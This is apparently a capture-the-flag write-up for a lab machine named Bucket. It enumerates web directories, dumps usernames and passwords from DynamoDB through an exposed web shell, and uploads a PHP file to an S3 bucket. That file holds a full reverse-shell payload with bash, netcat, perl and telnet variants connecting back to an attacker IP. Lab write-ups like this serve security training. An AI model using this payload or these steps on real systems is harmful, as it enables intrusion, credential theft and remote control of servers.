# Enumeration


Enumerate Web Page
---------------------------------------------------------------

After nmap scan, we add `http://bucket.htb` to  our `/etc/hosts` file and visit the website
By viewing page source code, we see that the website is fetching images from `http://s3.bucket.htb` => we add that domain to our `hosts` file too and visit it

Running directories enumeration with gobuster for those 2 domains:
```
gobuster dir -u http://bucket.htb -w <word_list>
gobuster dir -u http://s3.bucket.htb -w <word_list>

```
The scan result show us that `http://s3.bucket.htb` have some interesting directories:
```
/shell
/shellscripts
```

Now we go to visit `http://s3.bucket.htb/shell/` (Note: `/` in the end is a must, I have struggled with this for a while until someone showed me that the `/` is actually important :( )

We can see that is a dynamoDB web-shell, with the capabilities to interact with dynamoDB javascript client in the web shell, we can perform queries to the DB and fetch valuable information

```
let params = {
    "TableName" : "users"
}
dynamodb.scan(params, (err,data) => {
    if (err) console.log(err)
    else console.log(data)
})
```
The data we got back from dynamoDB include `username` and `password` that can be valueable for further uses. Right now we don't have anywhere to use it.

Enumerate S3 Bucket
------------------------------------------------------------

We execute this command to enumerate the s3 bucket
```
docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli configure
docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3.bucket.htb s3 ls s3://adserver/images/
```
After a quick check, list of available commands that we can use in aws cli in `s3.bucket.htb` include cp/move/delete
=> That's mean we can get our reverse shell by uploading rev shell file to s3 server.

Reverse shell payload:
```

<?php
echo 'running shell';
$ip='10.10.14.96';   #Change this
$port='8787';
$reverse_shells = array(
    '/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1',
    '0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; /bin/sh <&196 >&196 2>&196',
    '/usr/bin/nc '.$ip.' '.$port.' -e /bin/bash',
    'nc.exe -nv '.$ip.' '.$port.' -e cmd.exe',
    "/usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"".$ip.":".$port."\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    'rm -f /tmp/p; mknod /tmp/p p && telnet '.$ip.' '.$port.' 0/tmp/p',
    'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
);
foreach ($reverse_shells as $reverse_shell) {
   try {echo system($reverse_shell);} catch (Exception $e) {echo $e;}
   try {shell_exec($reverse_shell);} catch (Exception $e) {echo $e;}
   try {exec($reverse_shell);} catch (Exception $e) {echo $e;}
}
system('id');
?>
```
Uploading reverse shell:
```
docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3.bucket.htb/ s3 cp myrev.php s3://adserver/myrev.php
```
